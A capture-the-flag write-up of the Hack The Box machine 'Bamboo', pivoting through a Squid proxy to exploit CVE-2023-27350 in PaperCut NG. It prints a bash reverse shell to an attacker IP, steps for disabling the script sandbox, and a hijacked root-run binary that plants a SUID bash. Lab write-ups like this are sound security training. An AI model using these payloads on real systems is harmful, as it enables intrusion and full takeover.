---
icon: chopsticks
cover: ../../../../.gitbook/assets/Screenshot 2026-02-03 211748.png
coverY: -12.761785040854809
---

# HTB-BAMBOO(VL)

<figure><img src="../../../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Initial Port Scan

I started with a Rustscan to identify open ports on the target machine.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ rustscan -a 10.123.235.12 blah blah blha cmds
```

**Results:**

* **Port 22/tcp** - SSH (OpenSSH 8.9p1 Ubuntu)
* **Port 3128/tcp** - Squid HTTP Proxy 5.9

Based on the OpenSSH version, the target is likely running **Ubuntu 22.04 Jammy LTS**.

Both ports showed a TTL of 63, confirming the target is a Linux system one hop away.

***

### Enumeration - Squid Proxy (Port 3128)

#### Understanding Squid Proxy

Squid is an HTTP proxy server that can be configured with or without authentication. When I tried accessing it directly via a web browser, it returned an error page showing **Squid version 5.9**.

The key insight here is that Squid proxies often protect internal services that aren't directly accessible from the external network.

#### Proxied Port Scanning

To discover what services are running behind the Squid proxy, I used **Spose** - a tool designed specifically for scanning through Squid proxies.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ git clone https://github.com/aancw/spose.git

┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ cd spose/

┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO/spose]
└─$ uv add --script spose.py -r requirements.txt

┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO/spose]
└─$ uv run spose.py --proxy http://10.123.235.12:3128 --target localhost --allports
```

**Discovery:** The scan revealed several internal ports:

* **localhost:22** - SSH (already known)
* **localhost:9191** - PaperCut NG
* **localhost:9192** - PaperCut NG SSL
* **localhost:9195** - PaperCut NG High Security Port

These port numbers (9191, 9192, 9195) are the default ports for **PaperCut NG**, a print management application.

#### Configuring Proxychains

To interact with these internal services, I configured proxychains to route traffic through the Squid proxy.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ sudo nano /etc/proxychains.conf
```

I added the following configuration at the bottom of the file:

```
[ProxyList]
http    10.123.235.12   3128
```

**Testing the configuration:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ proxychains curl http://127.0.0.1:9191 -v
```

The connection succeeded, confirming that proxychains was properly routing traffic through the Squid proxy to the internal PaperCut service.

Additionally, I configured **Burp Suite** to use the Squid proxy as an upstream proxy server, allowing me to interact with the internal web application through my browser.

***

### Exploitation - PaperCut NG (CVE-2023-27350)

#### Identifying the Vulnerability

After accessing the PaperCut NG login page at `http://127.0.0.1:9191`, I discovered it was running **version 22.0**.

Research revealed that PaperCut NG 22.0 is vulnerable to **CVE-2023-27350**, an unauthenticated remote code execution vulnerability with a CVSS score of 9.8/10.

**Vulnerability Details:**

* **CVE-2023-27350** - Authentication bypass leading to RCE
* The flaw exists in the `SetupCompleted` class
* Attackers can bypass authentication and execute arbitrary code as SYSTEM
* No authentication required

#### Manual Exploitation

**Step 1: Authentication Bypass**

I navigated to the setup completion page through the Squid proxy:

```
http://127.0.0.1:9191/app?service=page/SetupCompleted
```

This page presents a "Login" button that bypasses all authentication checks when clicked, granting access to the authenticated admin dashboard.

**Step 2: Enable Print Scripting**

Once authenticated, I needed to enable scripting capabilities:

1. Navigated to **Options → Config Editor**
2. Filtered for "script" settings
3. Modified two critical settings:
   * **`print-and-device.script.enabled`** → Set to **Y** (enables scripting)
   * **`print.script.sandboxed`** → Set to **N** (disables sandbox protection)

**Step 3: Code Execution via Print Script**

1. Went to **Printers** section
2. Selected the available printer
3. Clicked on the **Scripting** tab
4. Enabled **"Enable print script"** checkbox

**Testing with ICMP:**

I first tested code execution with a ping command:

```javascript
function printJobHook(inputs, actions) {
    // Function must exist
}

// Code outside function executes when saved
Runtime.getRuntime().exec("ping -c 1 10.10.14.23");
```

Started tcpdump to monitor for ICMP packets:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ sudo tcpdump -ni tun0 icmp
```

After clicking **Apply**, I received ICMP echo requests, confirming code execution.

**Step 4: Reverse Shell**

I replaced the ping command with a bash reverse shell:

```javascript
function printJobHook(inputs, actions) {
    // Function must exist
}

Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/10.10.14.23/443 0>&1'");
```

Started a netcat listener:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ nc -lnvp 443
```

Clicked **Apply**, and received a shell as the `papercut` user!

**Step 5: Shell Upgrade**

I upgraded to a fully interactive TTY:

```bash
papercut@bamboo:~/server$ script /dev/null -c bash
papercut@bamboo:~/server$ ^Z
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ stty raw -echo; fg
```

```bash
papercut@bamboo:~/server$ reset
papercut@bamboo:~/server$ export TERM=screen
```

**Step 6: User Flag**

```bash
papercut@bamboo:~$ cat user.txt
57510b56************************
```

***

### Privilege Escalation to Root

#### System Enumeration

After gaining access as the `papercut` user, I began enumerating the system for privilege escalation vectors.

**Users with shell access:**

```bash
papercut@bamboo:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
papercut:x:1001:1001:,,,:/home/papercut:/bin/bash
```

**Sudo privileges:**

```bash
papercut@bamboo:~$ sudo -l
[sudo] password for papercut:
```

No sudo access without a password.

#### Process Monitoring with pspy

I uploaded **pspy64** to monitor processes running as root:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/BAMBOO]
└─$ python3 -m http.server 80
```

```bash
papercut@bamboo:/dev/shm$ wget http://10.10.14.23/pspy64
papercut@bamboo:/dev/shm$ chmod +x pspy64
papercut@bamboo:/dev/shm$ ./pspy64
```

While running pspy, I explored the PaperCut web interface.

#### Triggering Root Process

I navigated through the web interface:

1. **Enable Printing** section
2. Clicked the **"<"** button on the right side
3. Selected **"Import BYOD-friendly print queues"**
4. Clicked **"Next"**
5. Clicked **"Start Importing Mobility Print printers"**

**pspy output showed:**

```
2026/01/28 00:47:16 CMD: UID=0 PID=10219 | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
```

This revealed that **root** was executing the `server-command` binary from the papercut user's directory!

#### Binary Hijacking

I verified the permissions:

```bash
papercut@bamboo:~/server/bin/linux-x64$ ls -l server-command
-rwxr-xr-x 1 papercut papercut 493 Sep 29  2022 server-command

papercut@bamboo:~/server/bin/linux-x64$ ls -ld .
drwxr-xr-x 3 papercut papercut 4096 May 26  2023 .
```

The `papercut` user owns both the directory and the binary, allowing me to replace it.

**Exploitation strategy:** Create a malicious `server-command` that copies bash to /tmp with SUID permissions.

```bash
papercut@bamboo:~/server/bin/linux-x64$ mv server-command server-command.bk

papercut@bamboo:~/server/bin/linux-x64$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/sn0x\nchown root:root /tmp/sn0x\nchmod 6777 /tmp/sn0x' | tee server-command

papercut@bamboo:~/server/bin/linux-x64$ chmod +x server-command
```

#### Triggering the Exploit

I returned to the web interface and clicked **"Refresh servers"** to trigger the root process.

**Verification:**

```bash
papercut@bamboo:~/server/bin/linux-x64$ ls -l /tmp/sn0x
-rwsrwsrwx 1 root root 1396520 Jan 28 00:57 /tmp/sn0x
```

Perfect! The SUID bit is set, and the binary is owned by root.

#### Root Shell

```bash
papercut@bamboo:~/server/bin/linux-x64$ /tmp/sn0x -p
sn0x-5.1# id
uid=1001(papercut) gid=1001(papercut) euid=0(root) egid=0(root) groups=0(root),1001(papercut)
```

#### Root Flag

```bash
sn0x-5.1# cat /root/root.txt
```

***

### Summary

This box demonstrated several important concepts:

1. **Proxy Pivoting** - Using Squid proxy to access internal services
2. **CVE Research** - Identifying and exploiting CVE-2023-27350 in PaperCut NG
3. **Authentication Bypass** - Leveraging the SetupCompleted page to gain admin access
4. **Code Execution** - Using print scripting features for RCE
5. **Process Monitoring** - Using pspy to identify privileged processes
6. **Binary Hijacking** - Exploiting writable binaries executed by root

**Attack Path:**

```
Squid Proxy (3128) → Internal PaperCut (9191) → CVE-2023-27350 → papercut shell → Binary Hijack → root
```
